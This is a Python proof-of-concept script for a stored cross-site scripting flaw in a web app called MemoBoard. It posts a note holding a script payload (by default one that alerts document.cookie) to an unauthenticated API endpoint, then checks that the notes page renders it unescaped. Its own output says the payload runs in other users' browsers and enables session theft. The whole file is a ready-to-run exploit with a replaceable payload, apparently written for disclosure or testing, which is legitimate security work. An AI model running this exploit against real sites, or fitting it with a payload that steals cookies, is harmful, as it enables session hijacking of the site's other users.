#!/usr/bin/env python3
"""PoC: MemoBoard stored XSS via POST /api/notes body rendered with | safe

1. Create a note with XSS payload in body (no auth required)
2. Fetch /notes page and verify the payload is rendered unescaped
"""
import argparse
import json
import os
import urllib.request
import urllib.parse


def never_bypass(host, **kwargs):
    return False


def opener(proxy: str):
    if not proxy:
        return urllib.request.build_opener()
    os.environ["no_proxy"] = ""
    os.environ["NO_PROXY"] = ""
    urllib.request.proxy_bypass = never_bypass
    if hasattr(urllib.request, "proxy_bypass_environment"):
        urllib.request.proxy_bypass_environment = never_bypass
    if hasattr(urllib.request, "proxy_bypass_registry"):
        urllib.request.proxy_bypass_registry = never_bypass
    handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
    return urllib.request.build_opener(handler)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard Stored XSS PoC")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument("--payload", default="<script>alert(document.cookie)</script>",
                    help="XSS payload for note body")
    args = p.parse_args()

    base = args.url.rstrip("/")
    http = opener(args.proxy)

    # Step 1: Create a note with XSS payload (no auth required)
    print("[*] Step 1: Creating note with XSS payload...")
    note_data = json.dumps({
        "title": "xss-test",
        "body": args.payload,
        "author": "attacker"
    }).encode("utf-8")
    create_req = urllib.request.Request(
        f"{base}/api/notes",
        data=note_data,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        resp = http.open(create_req, timeout=15)
        create_body = resp.read().decode("utf-8", errors="replace")
        print(f"[*] Create note response: {resp.status} {create_body}")
        if resp.status != 201:
            print("[-] Failed to create note.")
            return 1
    except urllib.error.HTTPError as e:
        print(f"[-] Create note failed: HTTP {e.code}")
        return 1

    # Step 2: Fetch /notes page and verify XSS payload is rendered unescaped
    print("[*] Step 2: Fetching /notes page to verify XSS payload is rendered...")
    notes_req = urllib.request.Request(f"{base}/notes", headers={"Accept": "text/html"})
    try:
        resp = http.open(notes_req, timeout=15)
        status = resp.status
        page = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        page = e.read().decode("utf-8", errors="replace")

    print(f"[*] HTTP Status: {status}")
    print(f"[*] Page length: {len(page)} bytes")

    # Check if the raw XSS payload appears unescaped in the HTML
    if args.payload in page:
        print(f"\n[+] SUCCESS: XSS payload found unescaped in /notes page HTML.")
        print(f"[+] Payload rendered: {args.payload}")
        print(f"[+] The <script> tag will execute in other users' browsers, enabling session theft.")
        # Show the relevant section
        idx = page.find(args.payload)
        start = max(0, idx - 100)
        end = min(len(page), idx + len(args.payload) + 100)
        print(f"\n[*] Context around payload:")
        print(page[start:end])
        return 0
    else:
        print("\n[-] XSS payload not found unescaped in page.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())